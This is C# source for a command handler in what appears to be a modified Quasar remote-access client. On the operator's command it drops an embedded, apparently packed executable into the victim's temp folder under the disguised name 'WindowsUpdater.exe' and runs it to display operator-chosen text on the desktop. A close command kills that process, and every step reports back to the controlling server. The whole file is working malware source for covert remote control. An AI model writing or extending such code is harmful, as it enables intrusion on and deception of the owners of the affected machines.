using Quasar.Client.Utilities;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class RedTextHandler : IMessageProcessor
    {

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetClassName(IntPtr hwnd, StringBuilder lpClassName, int nMaxCount);

        public bool CanExecute(IMessage message) => message is DoShowRedText;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShowRedText msg:
                    Execute(sender, msg);
                    break;
                default:
                    break;
            }
        }

        private void Execute(ISender client, DoShowRedText message)
        {
            
            new Thread(() =>
            {
                string actionStr = message.Action;
                bool flag7 = false;
                string contentStr = ""; //display text
                contentStr = message.Text;
                string str = "WindowsUpdater"; // window class name

                string text9 = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".txt");
                if (actionStr == "close")
                {
                    contentStr = "";
                    flag7 = true;

                    IntPtr hwnd = FindWindow("WindowsUpdate", null);  // Find the window by class name

                    if (hwnd != IntPtr.Zero)
                    {
                        // Get the process ID associated with the window
                        uint processId;
                        GetWindowThreadProcessId(hwnd, out processId);

                        // Get the process object
                        Process process = Process.GetProcessById((int)processId);

                        // Kill the process
                        if (process != null)
                        {
                            // Console.WriteLine($"Terminating process: {process.ProcessName} (PID: {processId})");
                            process.Kill();
                            client.Send(new NotifyMessageToServer { Message = "Closed Red Text Window" });
                            return;
                            // Console.WriteLine("Process terminated.");
                        }
                    }
                    else
                    {
                        // Console.WriteLine("Window not found.");
                        client.Send(new NotifyMessageToServer { Message = "There is no Red Text Window" });
                        return;
                    }
                }
                try
                {
                    File.WriteAllText(text9, contentStr, System.Text.Encoding.Unicode);
                    // File.WriteAllText(text9, contentStr);
                }
                catch (Exception)
                {
                    client.Send(new NotifyMessageToServer { Message = "Invisible text writing error!" });
                }
                if (message.WindowClassName != null)
                {
                    // str = message.WindowClassName;
                }
                string text10 = Path.Combine(Path.GetTempPath(), str + ".exe");
                try
                {
                    byte[] invisibleWindow_vmp = Resource1.RedTextDesktopApp;
                    File.WriteAllBytes(text10, invisibleWindow_vmp);
                }
                catch (Exception)
                {
                    // client.Send(new NotifyMessageToServer { Message = "RedText app writing error!" });
                }
                int num = 36;
                if (message.FontSize != 0)  // font size
                {
                    num = message.FontSize;
                }
                try
                {
                    NativeMethods.STARTUPINFO structure = default(NativeMethods.STARTUPINFO);
                    NativeMethods.PROCESS_INFORMATION process_INFORMATION = default(NativeMethods.PROCESS_INFORMATION);
                    structure.cb = (uint)Marshal.SizeOf<NativeMethods.STARTUPINFO>(structure);
                    List<string> desktopNames = new List<string>();

                    // Enumerate through all desktops
                    //NativeMethods.EnumDesktops(NativeMethods.GetProcessWindowStation(), delegate (string desktop, IntPtr lParam)
                    //{
                    //    desktopNames.Add(desktop);
                    //    return true; // Continue enumeration
                    //}, IntPtr.Zero);

                    //foreach(var name in desktopNames)
                    //{
                    //    MessageBox.Show(name);
                    //}

                    //structure.lpDesktop = "Winlogon"; 
                    
                    if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\"", text10, text9, num), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
                    {
                        Process.Start(text10, text9);
                        if (!flag7)
                        {
                            client.Send(new NotifyMessageToServer { Message = string.Format("{0}","Invisible text showed (on Default desktop)!") });
                        }
                    }
                    else if (!flag7)
                    {
                        client.Send(new NotifyMessageToServer { Message = string.Format("{0}", string.Format("Invisible text showed (on {0} desktop)!", "Desktop")) });
                    }
                    return;
                }
                catch (Exception ex16)
                {
                    if (!flag7)
                    {
                        client.Send(new NotifyMessageToServer { Message = string.Format("{0}", ex16.Message) });
                    }
                    return;
                }
            })
            { IsBackground = true }.Start();
        }
    }
}
